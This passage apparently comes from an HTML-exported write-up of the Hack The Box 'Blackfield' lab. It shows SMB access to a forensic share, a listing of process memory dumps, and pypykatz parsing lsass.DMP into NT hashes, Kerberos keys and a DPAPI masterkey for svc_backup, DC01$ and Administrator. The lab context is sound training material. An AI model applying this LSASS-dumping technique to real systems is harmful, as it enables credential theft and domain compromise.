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ArCAQAAAAAAoNNDpA0AAAAAAABgJCzZDAAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGAkRNoAAAAAAAAARkKkDQAAAAAAAGCk/w8AAP///MaZgQAAAAZJREFUAwAIV2yQI2LMWwAAAABJRU5ErkJggg==" alt="dd7981dfb11ba6d0d206ea5259e4577c.png"/></p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Blackfield]
+&boxur;&boxh;$ smbclient //blackfield.local/forensic -U blackfield.local/audit2020
+Password for [BLACKFIELD.LOCAL\audit2020]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Sun Feb 23 08:03:16 2020
+  ..                                  D        0  Sun Feb 23 08:03:16 2020
+  commands_output                     D        0  Sun Feb 23 13:14:37 2020
+  memory_analysis                     D        0  Thu May 28 16:28:33 2020
+  tools                               D        0  Sun Feb 23 08:39:08 2020
+
+        5102079 blocks of size 4096. 1694324 blocks available
+smb: \&gt; </pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Blackfield]
+&boxur;&boxh;$ smbclient //blackfield.local/forensic -U blackfield.local/audit2020
+Password for [BLACKFIELD.LOCAL\audit2020]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D       <span class="hljs-number"> 0 </span> Sun Feb<span class="hljs-number"> 23 </span>08:03:16 2020
+  ..                                  D       <span class="hljs-number"> 0 </span> Sun Feb<span class="hljs-number"> 23 </span>08:03:16 2020
+  commands_output                     D       <span class="hljs-number"> 0 </span> Sun Feb<span class="hljs-number"> 23 </span>13:14:37 2020
+  memory_analysis                     D       <span class="hljs-number"> 0 </span> Thu May<span class="hljs-number"> 28 </span>16:28:33 2020
+  tools                               D       <span class="hljs-number"> 0 </span> Sun Feb<span class="hljs-number"> 23 </span>08:39:08 2020
+
+       <span class="hljs-number"> 5102079 </span>blocks of size 4096.<span class="hljs-number"> 1694324 </span>blocks available
+smb: \&gt; </code></pre></div>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">\memory_analysis
+  .                                   D        0  Thu May 28 16:28:33 2020
+  ..                                  D        0  Thu May 28 16:28:33 2020
+  conhost.zip                         A 37876530  Thu May 28 16:25:36 2020
+  ctfmon.zip                          A 24962333  Thu May 28 16:25:45 2020
+  dfsrs.zip                           A 23993305  Thu May 28 16:25:54 2020
+  dllhost.zip                         A 18366396  Thu May 28 16:26:04 2020
+  ismserv.zip                         A  8810157  Thu May 28 16:26:13 2020
+  lsass.zip                           A 41936098  Thu May 28 16:25:08 2020
+  mmc.zip                             A 64288607  Thu May 28 16:25:25 2020
+  RuntimeBroker.zip                   A 13332174  Thu May 28 16:26:24 2020
+  ServerManager.zip                   A 131983313  Thu May 28 16:26:49 2020
+  sihost.zip                          A 33141744  Thu May 28 16:27:00 2020
+  smartscreen.zip                     A 33756344  Thu May 28 16:27:11 2020
+  svchost.zip                         A 14408833  Thu May 28 16:27:19 2020
+  taskhostw.zip                       A 34631412  Thu May 28 16:27:30 2020
+  winlogon.zip                        A 14255089  Thu May 28 16:27:38 2020
+  wlms.zip                            A  4067425  Thu May 28 16:27:44 2020
+  WmiPrvSE.zip                        A 18303252  Thu May 28 16:27:53 2020</pre><pre class="hljs"><code>\memory_analysis
+  .                                   D        0  Thu May 28 16:28:33 2020
+  ..                                  D        0  Thu May 28 16:28:33 2020
+  conhost.zip                         A 37876530  Thu May 28 16:25:36 2020
+  ctfmon.zip                          A 24962333  Thu May 28 16:25:45 2020
+  dfsrs.zip                           A 23993305  Thu May 28 16:25:54 2020
+  dllhost.zip                         A 18366396  Thu May 28 16:26:04 2020
+  ismserv.zip                         A  8810157  Thu May 28 16:26:13 2020
+  lsass.zip                           A 41936098  Thu May 28 16:25:08 2020
+  mmc.zip                             A 64288607  Thu May 28 16:25:25 2020
+  RuntimeBroker.zip                   A 13332174  Thu May 28 16:26:24 2020
+  ServerManager.zip                   A 131983313  Thu May 28 16:26:49 2020
+  sihost.zip                          A 33141744  Thu May 28 16:27:00 2020
+  smartscreen.zip                     A 33756344  Thu May 28 16:27:11 2020
+  svchost.zip                         A 14408833  Thu May 28 16:27:19 2020
+  taskhostw.zip                       A 34631412  Thu May 28 16:27:30 2020
+  winlogon.zip                        A 14255089  Thu May 28 16:27:38 2020
+  wlms.zip                            A  4067425  Thu May 28 16:27:44 2020
+  WmiPrvSE.zip                        A 18303252  Thu May 28 16:27:53 2020</code></pre></div>
+<p>The <code class="inline-code">DMP</code> files are dump files. Using tools like <code class="inline-code">Pypykatz</code>, it is possible to observe the contents of the dump files. The <code class="inline-code">lsass.DMP</code> file contains credentials:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Blackfield/Memory-Analysis]
+&boxur;&boxh;$ pypykatz lsa minidump lsass.DMP 
+INFO:pypykatz:Parsing file lsass.DMP
+FILE: ======== lsass.DMP =======
+== LogonSession ==
+authentication_id 406458 (633ba)
+session_id 2
+username svc_backup
+domainname BLACKFIELD
+logon_server DC01
+logon_time 2020-02-23T18:00:03.423728+00:00
+sid S-1-5-21-4194615774-2175524697-3563712290-1413
+luid 406458
+    == MSV ==
+        Username: svc_backup
+        Domain: BLACKFIELD
+        LM: NA
+        NT: 9658d1d1dcd9250115e2205d9f48400d
+        SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
+        DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000
+    == WDIGEST [633ba]==
+        username svc_backup
+        domainname BLACKFIELD
+        password None
+        password (hex)
+    == Kerberos ==
+        Username: svc_backup
+        Domain: BLACKFIELD.LOCAL
+        AES128 Key: 9658d1d1dcd9250115e2205d9f48400d
+        AES256 Key: 20a3e879a3a0ca4f51db1e63514a27ac18eef553d8f30c29805c398c97599e91
+    == WDIGEST [633ba]==
+        username svc_backup
+        domainname BLACKFIELD
+        password None
+        password (hex)
+
+== LogonSession ==
+authentication_id 365835 (5950b)
+session_id 2
+username UMFD-2
+domainname Font Driver Host
+logon_server 
+logon_time 2020-02-23T17:59:38.218491+00:00
+sid S-1-5-96-0-2
+luid 365835
+    == MSV ==
+        Username: DC01$
+        Domain: BLACKFIELD
+        LM: NA
+        NT: b624dc83a27cc29da11d9bf25efea796
+        SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
+        DPAPI: 0000000000000000000000000000000000000000
+    == WDIGEST [5950b]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+    == Kerberos ==
+        Username: DC01$
+        Domain: BLACKFIELD.local
+        Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        AES128 Key: b624dc83a27cc29da11d9bf25efea796
+        AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
+    == WDIGEST [5950b]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+
+== LogonSession ==
+authentication_id 365493 (593b5)
+session_id 2
+username UMFD-2
+domainname Font Driver Host
+logon_server 
+logon_time 2020-02-23T17:59:38.200147+00:00
+sid S-1-5-96-0-2
+luid 365493
+    == MSV ==
+        Username: DC01$
+        Domain: BLACKFIELD
+        LM: NA
+        NT: b624dc83a27cc29da11d9bf25efea796
+        SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
+        DPAPI: 0000000000000000000000000000000000000000
+    == WDIGEST [593b5]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+    == Kerberos ==
+        Username: DC01$
+        Domain: BLACKFIELD.local
+        Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        AES128 Key: b624dc83a27cc29da11d9bf25efea796
+        AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
+    == WDIGEST [593b5]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+
+== LogonSession ==
+authentication_id 257142 (3ec76)
+session_id 0
+username DC01$
+domainname BLACKFIELD
+logon_server 
+logon_time 2020-02-23T17:59:13.318909+00:00
+sid S-1-5-18
+luid 257142
+    == Kerberos ==
+        Username: DC01$
+        Domain: BLACKFIELD.LOCAL
+
+== LogonSession ==
+authentication_id 153705 (25869)
+session_id 1
+username Administrator
+domainname BLACKFIELD
+logon_server DC01
+logon_time 2020-02-23T17:59:04.506080+00:00
+sid S-1-5-21-4194615774-2175524697-3563712290-500
+luid 153705
+    == MSV ==
+        Username: Administrator
+        Domain: BLACKFIELD
+        LM: NA
+        NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
+        SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368
+        DPAPI: 240339f898b6ac4ce3f34702e4a8955000000000
+    == WDIGEST [25869]==
+        username Administrator
+        domainname BLACKFIELD
+        password None
+        password (hex)
+    == Kerberos ==
+        Username: Administrator
+        Domain: BLACKFIELD.LOCAL
+        AES128 Key: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
+        AES256 Key: ec841e1e29ad7d6332a243b6b4ab445839829244408269850ab7c78a2cf45615
+    == WDIGEST [25869]==
+        username Administrator
+        domainname BLACKFIELD
+        password None
+        password (hex)
+    == DPAPI [25869]==
+        luid 153705
+        key_guid d1f69692-cfdc-4a80-959e-bab79c9c327e
+        masterkey 769c45bf7ceb3c0e28fb78f2e355f7072873930b3c1d3aef0e04ecbb3eaf16aa946e553007259bf307eb740f222decadd996ed660ffe648b0440d84cd97bf5a5
+        sha1_masterkey d04452f8459a46460939ced67b971bcf27cb2fb9
+
+== LogonSession ==
+authentication_id 137110 (21796)
+session_id 0
+username DC01$
+domainname BLACKFIELD
+logon_server 
+logon_time 2020-02-23T17:58:27.068590+00:00
+sid S-1-5-18
+luid 137110
+    == Kerberos ==
+        Username: DC01$
+        Domain: BLACKFIELD.LOCAL
+
+== LogonSession ==
+authentication_id 134695 (20e27)
+session_id 0
+username DC01$
+domainname BLACKFIELD
+logon_server 
+logon_time 2020-02-23T17:58:26.678019+00:00
+sid S-1-5-18
+luid 134695
+    == Kerberos ==
+        Username: DC01$
+        Domain: BLACKFIELD.LOCAL
+
+== LogonSession ==
+authentication_id 40310 (9d76)
+session_id 1
+username DWM-1
+domainname Window Manager
+logon_server 
+logon_time 2020-02-23T17:57:46.897202+00:00
+sid S-1-5-90-0-1
+luid 40310
+    == MSV ==
+        Username: DC01$
+        Domain: BLACKFIELD
+        LM: NA
+        NT: b624dc83a27cc29da11d9bf25efea796
+        SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
+        DPAPI: 0000000000000000000000000000000000000000
+    == WDIGEST [9d76]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+    == Kerberos ==
+        Username: DC01$
+        Domain: BLACKFIELD.local
+        Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        AES128 Key: b624dc83a27cc29da11d9bf25efea796
+        AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
+    == WDIGEST [9d76]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+
+== LogonSession ==
+authentication_id 40232 (9d28)
+session_id 1
+username DWM-1
+domainname Window Manager
+logon_server 
+logon_time 2020-02-23T17:57:46.897202+00:00
+sid S-1-5-90-0-1
+luid 40232
+    == MSV ==
+        Username: DC01$
+        Domain: BLACKFIELD
+        LM: NA
+        NT: b624dc83a27cc29da11d9bf25efea796
+        SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
+        DPAPI: 0000000000000000000000000000000000000000
+    == WDIGEST [9d28]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+    == Kerberos ==
+        Username: DC01$
+        Domain: BLACKFIELD.local
+        Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        AES128 Key: b624dc83a27cc29da11d9bf25efea796
+        AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
+    == WDIGEST [9d28]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+
+== LogonSession ==
+authentication_id 996 (3e4)
+session_id 0
+username DC01$
+domainname BLACKFIELD
+logon_server 
+logon_time 2020-02-23T17:57:46.725846+00:00
+sid S-1-5-20
+luid 996
+    == MSV ==
+        Username: DC01$
+        Domain: BLACKFIELD
+        LM: NA
+        NT: b624dc83a27cc29da11d9bf25efea796
+        SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
+        DPAPI: 0000000000000000000000000000000000000000
+    == WDIGEST [3e4]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+    == Kerberos ==
+        Username: dc01$
+        Domain: BLACKFIELD.local
